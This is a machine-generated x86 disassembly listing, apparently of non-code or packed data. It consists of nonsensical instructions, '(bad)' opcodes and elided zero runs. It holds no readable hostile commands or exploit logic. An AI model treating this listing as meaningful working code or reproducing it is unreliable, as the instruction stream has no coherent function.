  42b1f1:	or     DWORD PTR [edx+0x58],esi
  42b1f4:	sbb    DWORD PTR [ebp+0x2ff87e8c],ecx
  42b1fa:	add    DWORD PTR [ecx+0x56],ebx
  42b1fd:	xor    BYTE PTR [ecx],0x26
  42b200:	mov    dl,0x7a
  42b202:	fs scas eax,DWORD PTR es:[edi]
  42b204:	add    DWORD PTR [edi],esi
  42b206:	add    al,0xe2
  42b208:	cmc    
  42b209:	out    dx,al
  42b20a:	retf   0x9c39
  42b20d:	mov    ch,0xcf
  42b20f:	xchg   edi,eax
  42b210:	mov    edx,0xecf0c1ed
  42b215:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42b216:	add    eax,0xc8cff506
  42b21b:	xor    al,0xca
  42b21d:	push   eax
  42b21e:	cmp    dl,al
  42b220:	xor    al,0xf9
  42b222:	mov    al,ds:0xdf26ab67
  42b227:	mov    ds:0x395bb65f,eax
  42b22c:	cld    
  42b22d:	jecxz  0x42b295
  42b22f:	mov    bl,0x8
  42b231:	pushf  
  42b232:	outs   dx,BYTE PTR ds:[esi]
  42b233:	mov    ch,0x2d
  42b235:	inc    edi
  42b236:	cld    
  42b237:	pop    es
  42b238:	fs addr16 stc 
  42b23b:	inc    ebp
  42b23c:	pop    esp
  42b23d:	rcr    ch,0xe7
  42b240:	sub    esi,DWORD PTR [esi-0x27f6504f]
  42b246:	hlt    
  42b247:	enter  0xc241,0xae
  42b24b:	xchg   edi,eax
  42b24c:	mov    edi,0x247490b5
  42b251:	or     ebp,DWORD PTR ds:0x6600cc0c
  42b257:	push   ebp
  42b258:	lea    eax,[edx-0x5d22cd1e]
  42b25e:	test   DWORD PTR [bx+di-0x7a],esi
  42b262:	sub    ecx,DWORD PTR [eax]
  42b264:	push   0xc4118655
  42b269:	test   eax,0x4b402386
  42b26e:	cmp    bl,BYTE PTR [edx-0x4ede4e16]
  42b274:	mov    ch,0xd8
  42b276:	push   cs
  42b277:	push   es
  42b278:	cmp    bl,BYTE PTR [ebp+0x6e899447]
  42b27e:	adc    DWORD PTR [edi-0x7f7631d9],esi
  42b284:	adc    BYTE PTR [esi+eiz*4],0xf7
  42b288:	pop    es
  42b289:	cmc    
  42b28a:	xor    esi,DWORD PTR [ecx+0x1d]
  42b28d:	in     eax,0x6
  42b28f:	xlat   BYTE PTR ds:[ebx]
  42b290:	retf   0x136d
  42b293:	xor    DWORD PTR [esi],0xffffffd8
  42b296:	lahf   
  42b297:	dec    ebx
  42b298:	jnp    0x42b2a3
  42b29a:	push   ebx
  42b29b:	xlat   BYTE PTR ds:[ebx]
  42b29c:	adc    edx,DWORD PTR [ebx+0x33fc70e4]
  42b2a2:	push   es
  42b2a3:	stos   DWORD PTR es:[edi],eax
  42b2a4:	retf   
  42b2a5:	push   0x62
  42b2a7:	xor    al,BYTE PTR [edx+0x78]
  42b2aa:	mov    ebp,0x6f0fc2bd
  42b2af:	cs cmc 
  42b2b1:	sbb    BYTE PTR gs:[esi],bl
  42b2b4:	mov    al,0xe6
  42b2b6:	ret    0x9ba8
  42b2b9:	fwait
  42b2ba:	xor    DWORD PTR [ebx+0x3a],edx
  42b2bd:	scas   eax,DWORD PTR es:[edi]
  42b2be:	inc    eax
  42b2bf:	fs jno 0x42b2c2
	...
  42b332:	add    BYTE PTR [eax],al
  42b334:	jg     0x42b344
  42b336:	jne    0x42b373
  42b338:	jne    0x42b3b5
  42b33a:	jg     0x42b38a
  42b33c:	out    0x79,eax
  42b33e:	and    DWORD PTR [eax+0x7c],esi
  42b341:	dec    edx
  42b342:	dec    eax
  42b343:	ja     0x42b397
  42b345:	leave  
  42b346:	add    DWORD PTR [eax],eax
  42b348:	cmc    
  42b349:	add    BYTE PTR [eax],al
  42b34b:	add    bh,bl
  42b34d:	and    ebx,esi
  42b34f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42b350:	popf   
  42b351:	fwait
  42b352:	cmp    al,0xba
  42b354:	mov    ebx,0xc40982cb
  42b359:	mov    ah,0x8a
  42b35b:	imul   ebp,DWORD PTR [edx+0x6d29ffc4],0xe4779fa5
  42b365:	loop   0x42b39a
  42b367:	jp     0x42b30e
  42b369:	adc    bh,BYTE PTR [esi-0x6893f92d]
  42b36f:	jo     0x42b3c6
  42b371:	xchg   ecx,eax
  42b372:	cmp    al,0xdb
  42b374:	loope  0x42b381
  42b376:	inc    esp
  42b377:	cmp    BYTE PTR [esi+0x7169356],dh
  42b37d:	fucom  st(2)
  42b37f:	pop    es
  42b380:	idiv   BYTE PTR [edx-0x60]
  42b383:	daa    
  42b384:	repz jle 0x42b3f8
  42b387:	pusha  
  42b388:	add    al,0x3e
  42b38a:	repz adc DWORD PTR [ecx+0xbf98440],0x3f4f98f1
  42b395:	jns    0x42b402
  42b397:	pushf  
  42b398:	jecxz  0x42b37d
  42b39a:	fbstp  TBYTE PTR [eax-0x77]
  42b39d:	jbe    0x42b3b5
  42b39f:	rcr    BYTE PTR [ecx-0x6b33dc7d],0x0
  42b3a6:	pop    ecx
  42b3a7:	js     0x42b355
  42b3a9:	fwait
  42b3aa:	out    0x86,eax
  42b3ac:	cmp    BYTE PTR [ebx-0x5de23d96],al
  42b3b2:	in     eax,dx
  42b3b3:	mov    esi,0xe28d67b6
  42b3b8:	and    BYTE PTR [ecx+0xb],bl
  42b3bb:	rcl    DWORD PTR [eax-0x4a],1
  42b3be:	sbb    al,al
  42b3c0:	clc    
  42b3c1:	push   cs
  42b3c2:	cmp    BYTE PTR [eax],dh
  42b3c4:	fsub   QWORD PTR [ecx]
  42b3c6:	jl     0x42b372
  42b3c8:	adc    dl,BYTE PTR [edx-0x61]
  42b3cb:	pushf  
  42b3cc:	or     DWORD PTR [esi-0x16],ebp
  42b3cf:	ss sahf 
  42b3d1:	jp     0x42b373
  42b3d3:	mov    cs,ecx
  42b3d5:	lea    ecx,[edx+0x4d934865]
  42b3db:	jg     0x42b392
  42b3dd:	jb     0x42b445
  42b3df:	or     edi,edi
  42b3e1:	(bad)
  42b3e4:	push   0xf975e964
  42b3e9:	sar    DWORD PTR [esi-0x4],0x8b
  42b3ed:	mov    eax,0xd108d84d
  42b3f2:	mov    bh,0xaa
  42b3f4:	pop    edx
  42b3f5:	mov    eax,0xcef7c93a
  42b3fa:	lods   eax,DWORD PTR ds:[esi]
  42b3fb:	push   ecx
  42b3fc:	jne    0x42b3c6
  42b3fe:	cli    
  42b3ff:	jne    0x42b3c5
  42b401:	loope  0x42b412
  42b403:	scas   eax,DWORD PTR es:[edi]
  42b404:	daa    
  42b405:	adc    al,0x7b
  42b407:	push   ecx
  42b408:	gs xchg ecx,eax
  42b40a:	shl    BYTE PTR [ebp-0x7b],1
  42b40d:	xchg   ebp,eax
  42b40e:	aas    
  42b40f:	mov    edx,0xbe9580b8
  42b414:	push   cs
  42b415:	out    0x60,eax
  42b417:	xchg   ebx,eax
  42b418:	xchg   ecx,eax
  42b419:	add    al,0x52
  42b41b:	and    esi,DWORD PTR [ebx+0x2e]
  42b41e:	mov    esp,0xca011821
  42b423:	dec    ebx
  42b424:	sahf   
  42b425:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42b426:	jbe    0x42b3a9
  42b428:	mov    ecx,0x864018a3
  42b42d:	mov    ebp,0x3c27cc19
  42b432:	lods   eax,DWORD PTR ds:[esi]
  42b433:	cmp    DWORD PTR [ecx+0x57],eax
  42b436:	scas   al,BYTE PTR es:[edi]
  42b437:	push   0x796210ae
  42b43c:	and    dh,0xc4
  42b43f:	push   eax
  42b440:	mov    al,BYTE PTR [eax]
	...
  42b4b2:	add    BYTE PTR [eax],al
  42b4b4:	sbb    BYTE PTR [edi+0x17],cl
  42b4b7:	mov    ecx,0xefbef957
  42b4bc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42b4bd:	fstp   QWORD PTR [esi+0x5]
  42b4c0:	xchg   edx,eax
  42b4c1:	dec    eax
  42b4c2:	rol    dl,1
  42b4c4:	inc    edi
  42b4c5:	retf   0x1
  42b4c8:	cmc    
  42b4c9:	add    BYTE PTR [eax],al
  42b4cb:	add    BYTE PTR [ecx+0x3125225f],cl
  42b4d1:	inc    ecx
  42b4d2:	dec    esp
  42b4d3:	inc    eax
  42b4d4:	fs test ebx,esi
  42b4d7:	pop    edi
  42b4d8:	retf   0xc93c
  42b4db:	jbe    0x42b52a
  42b4dd:	inc    esp
  42b4de:	add    al,0x54
  42b4e0:	xor    eax,0x172cecb3
  42b4e5:	and    BYTE PTR [ecx-0x1b],ah
  42b4e8:	ds or  eax,0x572c9fdb
  42b4ee:	xlat   BYTE PTR ds:[ebx]
  42b4ef:	pop    ecx
  42b4f0:	mov    ch,0xeb
  42b4f2:	mov    esi,0x9daeed93
  42b4f7:	mov    esp,0xcb4b0ede
  42b4fc:	dec    BYTE PTR [eax+esi*8+0x71]
  42b500:	repnz rcl BYTE PTR [eax-0x49],cl
  42b504:	mov    ebx,0x90733d05
  42b509:	dec    eax
  42b50a:	retf   
  42b50b:	or     al,0xcc
  42b50d:	jle    0x42b50e
  42b50f:	repnz mov al,ds:0xdf1d60fc
  42b515:	sub    al,0xf8
  42b517:	out    0x78,eax
  42b519:	push   ebp
  42b51a:	or     bh,cl
  42b51c:	int3   
  42b51d:	adc    eax,0x9e18dc4
  42b522:	icebp  
  42b523:	(bad)  
  42b524:	mov    cl,0xa9
  42b526:	cli    
  42b527:	pop    ebp
  42b528:	jecxz  0x42b58f
  42b52a:	xchg   esp,eax
  42b52b:	xchg   edi,eax
  42b52c:	jns    0x42b520
  42b52e:	xchg   esi,eax
  42b52f:	sub    DWORD PTR [ecx+esi*1+0x11a3b5a3],ecx
  42b536:	jecxz  0x42b4e5
  42b538:	and    DWORD PTR [edi-0x1a438c1f],ebx
  42b53e:	jno    0x42b51c
  42b540:	pushf  
  42b541:	shr    DWORD PTR [ebp+ecx*4+0x6da7f715],cl
  42b548:	inc    ecx
  42b549:	mov    gs,WORD PTR [ecx-0x2ff49ce]
  42b54f:	jecxz  0x42b5b4
  42b551:	pop    eax
  42b552:	enter  0x45c7,0xee
  42b556:	dec    ebx
  42b557:	jns    0x42b5b1
  42b559:	sub    BYTE PTR [ebx+ecx*2+0x10],dl
  42b55d:	pop    ss
  42b55e:	mov    ebp,0x98963d00
  42b563:	adc    ch,BYTE PTR [esi]
  42b565:	pop    eax
  42b566:	in     eax,0xa4
  42b568:	call   0x32ac4aed
  42b56d:	retf   0x1f1b
  42b570:	jg     0x42b5c2
  42b572:	adc    al,0xe0
  42b574:	xchg   ebx,eax
  42b575:	add    al,0x9c
  42b577:	sub    dl,BYTE PTR [esi]
  42b579:	in     al,dx
  42b57a:	nop
  42b57b:	cmp    eax,0xb8fab6b0
  42b580:	pop    ds
  42b581:	pop    ebp
  42b582:	jne    0x42b582
  42b584:	pop    ds
  42b585:	js     0x42b564
  42b587:	aaa    
  42b588:	adc    DWORD PTR [eax+0x1],ebx
  42b58b:	cmp    BYTE PTR [ecx-0x3c],al
  42b58e:	mov    ebp,0x186f18bb
  42b593:	retf   
  42b594:	xchg   esp,eax
  42b595:	(bad)  
  42b596:	jge    0x42b588
  42b598:	mov    edx,DWORD PTR [esi-0x66]
  42b59b:	xor    DWORD PTR [ebp-0x33abe504],ebx
  42b5a1:	pop    eax
  42b5a2:	or     al,0x6
  42b5a4:	or     DWORD PTR [esi+0x7d],ebp
  42b5a7:	lea    ebp,[ebx-0x40ece657]
  42b5ad:	stc    
  42b5ae:	push   0x38
  42b5b0:	iret   
  42b5b1:	jbe    0x42b61c
  42b5b3:	jae    0x42b5f6
  42b5b5:	push   0xffffff9f
  42b5b7:	cmp    DWORD PTR [ebx+0x15adc141],eax
  42b5bd:	inc    esi
  42b5be:	or     BYTE PTR [ebx+edi*2],ah
	...
  42b631:	add    BYTE PTR [eax],al
  42b633:	add    BYTE PTR [esi+edx*1],ah
  42b636:	outs   dx,BYTE PTR ds:[esi]
  42b637:	(bad)  
  42b638:	jle    0x42b639
  42b63a:	lods   eax,DWORD PTR ds:[esi]
  42b63b:	not    esi
  42b63d:	mov    dl,dh
  42b63f:	add    dl,BYTE PTR [edi-0x14]
  42b642:	ret    0x3c87
  42b645:	retf   
  42b646:	add    DWORD PTR [eax],eax
  42b648:	cmc    
  42b649:	add    BYTE PTR [eax],al
  42b64b:	add    BYTE PTR [esi+0x5c],ah
  42b64e:	ins    DWORD PTR es:[edi],dx
  42b64f:	sub    BYTE PTR fs:[ebx],bl
  42b652:	in     eax,dx
  42b653:	pop    esp
  42b654:	(bad)  
  42b656:	mov    edx,0x2ccfd203
  42b65b:	cli    
  42b65c:	bnd jl 0x42b661
  42b65f:	jae    0x42b6b6
  42b661:	jno    0x42b6a8
  42b663:	sti    
  42b664:	push   ecx
  42b665:	mov    esi,0xb1935a61
  42b66a:	lds    ebx,FWORD PTR [edx-0x46e9da3c]
  42b670:	stos   DWORD PTR es:[edi],eax
  42b671:	call   0x47e:0x5cc783ff
  42b678:	dec    edx
  42b679:	call   0x6cde:0x3ee74caa
  42b680:	dec    esp
  42b681:	cmp    bh,bh
  42b683:	push   esp
  42b684:	xchg   ecx,eax
  42b685:	jmp    0x7dcba8ae
  42b68a:	lds    esi,FWORD PTR [ebx+ebp*4]
  42b68d:	imul   ebx,ebp,0xbc8669cb
  42b693:	fst    DWORD PTR [edi]
  42b695:	aam    0x21
  42b697:	inc    ecx
  42b698:	mov    ch,0x49
  42b69a:	mov    bl,0xba
  42b69c:	(bad)  
  42b69d:	and    BYTE PTR ss:[ecx],0x2b
  42b6a1:	jl     0x42b65e
  42b6a3:	test   al,0x54
  42b6a5:	xchg   DWORD PTR [ecx+0x6972597a],eax
  42b6ab:	cmp    BYTE PTR [edx],0x31
  42b6ae:	imul   esi,DWORD PTR [edi+0x51e40e8d],0xffffffad
  42b6b5:	fcmovbe st,st(7)
  42b6b7:	enter  0x4180,0x5
  42b6bb:	cmp    al,0x47
  42b6bd:	add    BYTE PTR [eax+ebp*1-0x48],bl
  42b6c1:	into   
  42b6c2:	adc    ebp,DWORD PTR [ecx+0x23]
  42b6c5:	mov    bh,0xb6
  42b6c7:	dec    edx
  42b6c8:	pop    ebp
  42b6c9:	push   ecx
  42b6ca:	mov    esp,0xbe46de8
  42b6cf:	fdivr  QWORD PTR [edx-0x39]
  42b6d2:	sub    BYTE PTR [ebx-0x2c3d00b8],0xca
  42b6d9:	mov    ebp,?
  42b6db:	adc    eax,0x93e3508c
  42b6e0:	dec    ebp
  42b6e1:	popa   
  42b6e2:	fisttp WORD PTR [esi]
  42b6e4:	dec    edx
  42b6e5:	mov    dh,dh
  42b6e7:	mov    esi,0x7a1f0d32
  42b6ec:	out    dx,eax
  42b6ed:	pop    edi
  42b6ee:	add    BYTE PTR [esi+0x15],ah
  42b6f1:	sti    
  42b6f2:	daa    
  42b6f3:	aad    0x30
  42b6f5:	rcl    BYTE PTR [ebp-0x4139ee66],0x1d
  42b6fc:	sub    eax,0xa22404d8
  42b701:	adc    esi,edi
  42b703:	cmp    esp,DWORD PTR [edi+0x6d]
  42b706:	sbb    cl,al
  42b708:	inc    BYTE PTR [ebx-0x5442ec0e]
  42b70e:	xchg   DWORD PTR [esi+0x21],ebx
  42b711:	ds call 0xbdd11f69
  42b717:	push   ds
  42b718:	aam    0x25
  42b71a:	in     al,0xfa
  42b71c:	out    0x89,eax
  42b71e:	xor    edx,DWORD PTR [ecx+0x45c092c0]
  42b724:	sbb    ch,BYTE PTR [ebx-0x2c]
  42b727:	jne    0x42b75f
  42b729:	aas    
  42b72a:	out    0x89,eax
  42b72c:	mov    esi,0x80b7128b
  42b731:	jle    0x42b726
  42b733:	dec    ecx
  42b734:	mov    ah,0x72
  42b736:	jecxz  0x42b7ae
  42b738:	mov    esi,0xce8db2cf
  42b73d:	xchg   BYTE PTR [edx+0xb325],al
	...
  42b7b3:	add    BYTE PTR [edx-0x10409c9b],cl
  42b7b9:	mov    edi,0x986a75de
  42b7be:	xor    eax,0xe0dffbfb
  42b7c3:	pop    ecx
  42b7c4:	xor    esp,ecx
  42b7c6:	add    DWORD PTR [eax],eax
  42b7c8:	cmc    
  42b7c9:	add    BYTE PTR [eax],al
  42b7cb:	add    BYTE PTR [edi+0x68],cl
  42b7ce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42b7cf:	cdq    
  42b7d0:	popa   
  42b7d1:	out    dx,eax
  42b7d2:	jmp    0x42b7ce
  42b7d4:	xchg   ecx,eax
  42b7d5:	popf   
  42b7d6:	dec    eax
  42b7d7:	inc    ecx
  42b7d8:	bound  ebp,QWORD PTR [ebx-0x17]
  42b7db:	and    ch,BYTE PTR [edx-0x3e]
  42b7de:	dec    esi
  42b7df:	bound  ebx,QWORD PTR [ebx-0x18]
  42b7e2:	enter  0x99a6,0x3a
  42b7e6:	in     eax,dx
  42b7e7:	sub    al,0x87
  42b7e9:	stos   DWORD PTR es:[edi],eax
  42b7ea:	neg    DWORD PTR [ebx-0x7a]
  42b7ed:	mov    ?,WORD PTR [edi-0x28]
  42b7f0:	jno    0x42b829
  42b7f2:	jo     0x42b7d2
  42b7f4:	aam    0x3f
  42b7f6:	lods   eax,DWORD PTR ds:[esi]
  42b7f7:	fisub  WORD PTR [edi+0x4f]
  42b7fa:	pop    fs
  42b7fc:	mov    edx,0x7d3bb70d
  42b801:	jno    0x42b7fe
  42b803:	loopne 0x42b7d2
  42b805:	dec    ebp
  42b806:	pop    esi
  42b807:	ret    0xc741
  42b80a:	and    esi,eax
  42b80c:	div    BYTE PTR [esi+0x7a]
  42b80f:	jo     0x42b7e1
  42b811:	cld    
  42b812:	fstp   QWORD PTR [edi-0x41214c65]
  42b818:	and    ah,ah
  42b81a:	imul   ebp,eax,0x2e
  42b81d:	mov    bl,0xff
  42b81f:	cmp    ebx,ebp
  42b821:	loope  0x42b7c6
  42b823:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42b824:	xchg   BYTE PTR [edx],ah
  42b826:	outs   dx,DWORD PTR ds:[esi]
  42b827:	aam    0x5e
  42b829:	mov    DWORD PTR [esi+edx*4-0x4a],edi
  42b82d:	xor    al,0x2c
  42b82f:	adc    BYTE PTR [esp+edx*4-0x514ce865],dh
  42b836:	add    cl,BYTE PTR [edi+0x39]
  42b839:	mov    eax,0x8de504ee
  42b83e:	cmc    
  42b83f:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  42b841:	mov    eax,0xf605b335
  42b846:	pop    edx
  42b847:	and    BYTE PTR [edx-0x2c],cl
  42b84a:	xchg   edi,eax
  42b84b:	mov    ebx,fs
  42b84d:	lds    esp,FWORD PTR [edi+0x5143c67b]
  42b853:	mov    dh,0xa4
  42b855:	cld    
  42b856:	in     eax,0xa2
  42b858:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42b859:	xor    bl,BYTE PTR [eax-0x2ea46175]
  42b85f:	ja     0x42b842
  42b861:	xor    BYTE PTR [edi+eax*1-0x42],dh
  42b865:	add    ah,dh
  42b867:	mov    ss,WORD PTR [ebp+0x4bfa38fc]
  42b86d:	nop
  42b86e:	mov    al,ds:0xfd768d79
  42b873:	sub    esi,DWORD PTR [eax]
  42b875:	data16 jl 0x42b815
  42b878:	lds    esp,FWORD PTR [eax]
  42b87a:	add    al,0x76
  42b87c:	fdiv   DWORD PTR [ecx+eiz*2]
  42b87f:	push   0xa45814ee
  42b884:	inc    ecx
  42b885:	fcomp  DWORD PTR [edx+0x42]
  42b888:	jg     0x42b81b
  42b88a:	push   esp
  42b88b:	rol    DWORD PTR [ecx-0x4e],0x72
  42b88f:	cmp    al,al
  42b891:	popa   
  42b892:	(bad)  
  42b893:	pop    esi
  42b894:	jecxz  0x42b84d
  42b896:	cli    
  42b897:	dec    esp
  42b898:	adc    eax,0x168baa97
  42b89d:	(bad)  
  42b89e:	or     dh,bh
  42b8a0:	cmp    ecx,DWORD PTR [esi]
  42b8a2:	mov    edx,0x5251cfdb
  42b8a7:	jbe    0x42b8ce
  42b8a9:	and    eax,0x8cd9daba
  42b8ae:	push   ebp
  42b8af:	fimul  DWORD PTR [ebx-0x2170ea71]
  42b8b5:	je     0x42b837
  42b8b7:	adc    BYTE PTR [esi+0x23],0x1f
  42b8bb:	mov    edi,0xc4c07ffb
  42b8c0:	test   BYTE PTR [eax],al
	...
  42b932:	add    BYTE PTR [eax],al
  42b934:	test   al,0x93
  42b936:	sbb    eax,0xfbee3fee
  42b93b:	xlat   BYTE PTR ds:[ebx]
  42b93c:	ss push esi
  42b93e:	inc    esp
  42b93f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42b940:	jbe    0x42b95a
  42b942:	and    eax,0x1cd2697
  42b947:	add    ch,dh
  42b949:	add    BYTE PTR [eax],al
  42b94b:	add    BYTE PTR [esi],ah
  42b94d:	out    0xf8,al
  42b94f:	jns    0x42b979
  42b951:	inc    ebp
  42b952:	mov    ebx,0x152c320b
  42b957:	cmp    dh,BYTE PTR [ebp-0x2239236b]
  42b95d:	fwait
  42b95e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42b95f:	mov    eax,0x377241e1
  42b964:	dec    esi
  42b965:	push   ss
  42b966:	daa    
  42b967:	add    DWORD PTR [esi+0x355e30ab],ecx
  42b96d:	xchg   ecx,eax
  42b96e:	pop    esp
  42b96f:	xchg   edx,eax
  42b970:	imul   ebp,ebp,0xee96935e
  42b976:	fwait
  42b977:	pop    ecx
  42b978:	cmp    edi,DWORD PTR [ebx+edi*2+0x2ba3dc64]
  42b97f:	daa    
  42b980:	mov    al,ds:0x154e7642
  42b985:	pop    ds
  42b986:	cwde   
  42b987:	push   ebp
  42b988:	rol    BYTE PTR [ebx+edx*2-0x578926b8],cl
  42b98f:	call   0xfd44356e
  42b994:	mov    al,0x24
  42b996:	and    al,0x9d
  42b998:	fstp   DWORD PTR [esi+0x1a5d356]
  42b99e:	mov    edi,0xf46c605e
  42b9a3:	pop    ss
  42b9a4:	xor    BYTE PTR [esi-0x57],bl
  42b9a7:	jno    0x42b972
  42b9a9:	stos   DWORD PTR es:[edi],eax
  42b9aa:	add    eax,0x8341915e
  42b9af:	and    BYTE PTR ds:0x4f25d2a8,ch
  42b9b5:	xor    DWORD PTR [ecx+ebx*8-0x35974f4d],eax
  42b9bc:	cld    
  42b9bd:	es push eax
  42b9bf:	arpl   WORD PTR [edi-0x30],ax
  42b9c2:	dec    ebx
  42b9c3:	xor    cl,BYTE PTR ss:[eax+0x31]
  42b9c7:	call   0x85d0:0xeec19004
  42b9ce:	xchg   ecx,eax
  42b9cf:	push   ecx
  42b9d0:	and    ch,0x86
  42b9d3:	inc    edi
  42b9d4:	jne    0x42b9e2
  42b9d6:	(bad)  
  42b9d7:	xlat   BYTE PTR ds:[ebx]
  42b9d8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42b9d9:	xor    DWORD PTR [ebx],edi
  42b9db:	sbb    al,0x52
  42b9dd:	fnstcw WORD PTR [esi-0x78]
  42b9e0:	inc    edx
  42b9e1:	inc    edx
  42b9e2:	xor    DWORD PTR [ecx-0x31d64a3],ebp
  42b9e8:	and    esp,esp
  42b9ea:	fnsave [edx-0x1b845647]
  42b9f0:	xor    ecx,DWORD PTR [ebx]
  42b9f2:	in     al,0x5f
  42b9f4:	lds    ebx,FWORD PTR [esi+0x44]
  42b9f7:	stos   DWORD PTR es:[edi],eax
  42b9f8:	pop    esi
  42b9f9:	psubd  mm3,QWORD PTR [edi]
  42b9fc:	leave  
  42b9fd:	jo     0x42b9b1
  42b9ff:	daa    
  42ba00:	(bad)  
  42ba01:	retf   0x81d1
  42ba04:	mov    eax,0xbe57c4c
  42ba09:	xlat   BYTE PTR ds:[ebx]
  42ba0a:	pop    esp
  42ba0b:	cmp    DWORD PTR [ecx+ebx*8-0x25],edx
  42ba0f:	loop   0x42b993
  42ba11:	inc    ecx
  42ba12:	mov    eax,0x4e8d1897
  42ba17:	mov    bl,0x89
  42ba19:	in     al,dx
  42ba1a:	daa    
  42ba1b:	xor    eax,DWORD PTR [edi+0x69]
  42ba1e:	outs   dx,DWORD PTR ds:[esi]
  42ba1f:	mov    ch,0x46
  42ba21:	sbb    eax,DWORD PTR [eax+0x75]
  42ba24:	push   esp
  42ba25:	mov    ebp,0xdf1c7dbe
  42ba2a:	retf   0x9d80
  42ba2d:	xchg   ebx,eax
  42ba2e:	fisttp QWORD PTR [edx+eiz*4]
  42ba31:	add    al,0x1f
  42ba33:	mov    ds:0x8b6d4ea,eax
  42ba38:	(bad)  
  42ba39:	sti    
  42ba3a:	dec    edi
  42ba3b:	not    DWORD PTR [edi+0x19b12a87]
	...
  42bab1:	add    BYTE PTR [eax],al
  42bab3:	add    BYTE PTR [esi],bh
  42bab5:	push   cs
  42bab6:	sub    al,0x5d
  42bab8:	cmp    al,0x7f
  42baba:	jg     0x42bb2b
  42babc:	cmp    al,BYTE PTR [esi+0x467b434c]
  42bac2:	mov    dh,0xab
  42bac4:	sbb    ecx,esi
  42bac6:	add    DWORD PTR [eax],eax
  42bac8:	cmc    
  42bac9:	add    BYTE PTR [eax],al
  42bacb:	add    BYTE PTR [ebp+0x50],dh
  42bace:	cmp    ebx,DWORD PTR [ecx-0x1002d85f]
  42bad4:	push   0xdb3afb51
  42bad9:	ins    DWORD PTR es:[edi],dx
  42bada:	sbb    ecx,DWORD PTR [ecx-0x58]
  42badd:	fwait
  42bade:	jmp    0xccf0:0x5210d203
  42bae5:	test   dh,cl
  42bae7:	scas   al,BYTE PTR es:[edi]
  42bae8:	dec    edx
  42bae9:	stc    
  42baea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42baeb:	popf   
  42baec:	repz mov bl,0x12
  42baef:	(bad)  
  42baf0:	adc    al,0x6d
  42baf2:	out    0xd9,eax
  42baf4:	sub    DWORD PTR [eax],edx
  42baf6:	fcomp  DWORD PTR [esi]
  42baf8:	xchg   esp,eax
  42baf9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42bafa:	jnp    0x42bafc
  42bafc:	xchg   DWORD PTR [edi+0x4dadd2d5],edi
  42bb02:	mov    ecx,cs
  42bb04:	sbb    al,0x1f
  42bb06:	dec    esi
  42bb07:	mov    esp,0x7f00cdfa
  42bb0c:	cmp    bl,dl
  42bb0e:	cwde   
  42bb0f:	push   ebp
  42bb10:	mov    es,WORD PTR ds:0x9a3f92e
  42bb16:	xor    BYTE PTR [ebx+0x37],cl
  42bb19:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42bb1a:	pop    ds
  42bb1b:	lock pop edx
  42bb1d:	mov    ebx,edi
  42bb1f:	pop    es
  42bb20:	aad    0x9
  42bb22:	cwde   
  42bb23:	fwait
  42bb24:	test   esi,esi
  42bb26:	cmc    
  42bb27:	(bad)  
  42bb28:	cmc    
  42bb29:	lahf   
  42bb2a:	mov    ecx,0xf4d5b072
  42bb2f:	push   ds
  42bb30:	retf   0x6a44
  42bb33:	jp     0x42bb5a
  42bb35:	loopne 0x42bb2c
  42bb37:	mov    ebp,DWORD PTR [ebp+edi*4-0x4b560e44]
  42bb3e:	adc    BYTE PTR [edi+edi*1-0x74],ch
  42bb42:	or     al,0x26
  42bb44:	sub    ebp,DWORD PTR ds:0x47966ed5
  42bb4a:	push   cs
  42bb4b:	mov    al,0x16
  42bb4d:	cmp    BYTE PTR [ebx-0x3dad3a12],dh
  42bb53:	test   BYTE PTR [ecx-0x7b],al
  42bb56:	fs ret 
  42bb58:	push   cs
  42bb59:	hlt    
  42bb5a:	xor    edx,DWORD PTR [eax+edx*8-0x7f18845d]
  42bb61:	into   
  42bb62:	call   0xea0f58ed
  42bb67:	xchg   DWORD PTR [ebx+0x4a],edi
  42bb6a:	(bad)  
  42bb6b:	out    0x71,al
  42bb6d:	and    ecx,DWORD PTR [esi+0x50]
  42bb70:	push   ecx
  42bb71:	hlt    
  42bb72:	in     al,0x63
  42bb74:	sbb    eax,ecx
  42bb76:	add    ebx,edi
  42bb78:	out    dx,al
  42bb79:	sub    DWORD PTR [edx],0x5e
  42bb7c:	push   ebp
  42bb7d:	push   0x36265b55
  42bb82:	inc    esp
  42bb83:	push   0xffffffb2
  42bb85:	int    0xd5
  42bb87:	in     eax,dx
  42bb88:	jmp    0x1be93a88
  42bb8d:	xor    eax,0xe87efe02
  42bb92:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42bb93:	push   cs
  42bb94:	mov    WORD PTR [ebx],fs
  42bb96:	pop    edx
  42bb97:	lods   eax,DWORD PTR ds:[esi]
  42bb98:	mov    es,WORD PTR [ebp-0x47df3959]
  42bb9e:	aam    0x11
  42bba0:	out    dx,eax
  42bba1:	mov    ebp,0x9eb1e817
  42bba6:	push   edi
  42bba7:	pop    eax
  42bba8:	pop    esi
  42bba9:	pop    edx
  42bbaa:	(bad)  ds:0x929126f4
  42bbb0:	mov    ecx,esi
  42bbb2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42bbb3:	js     0x42bbf2
  42bbb5:	stos   BYTE PTR es:[edi],al
  42bbb6:	fs not dh
  42bbb9:	xchg   bl,bl
  42bbbb:	jb     0x42bc2f
  42bbbd:	xchg   BYTE PTR [ebp+0x2b],ch
  42bbc0:	push   eax
	...
  42bc31:	add    BYTE PTR [eax],al
  42bc33:	add    cl,ch
  42bc35:	xor    bl,BYTE PTR [edx+edi*1]
  42bc38:	fistp  QWORD PTR [esi]
  42bc3a:	out    dx,eax
  42bc3b:	repz ffreep st(2)
  42bc3e:	(bad)  
  42bc3f:	aam    0x38
  42bc41:	std    
  42bc42:	(bad)  
  42bc43:	pop    esp
  42bc44:	adc    bh,cl
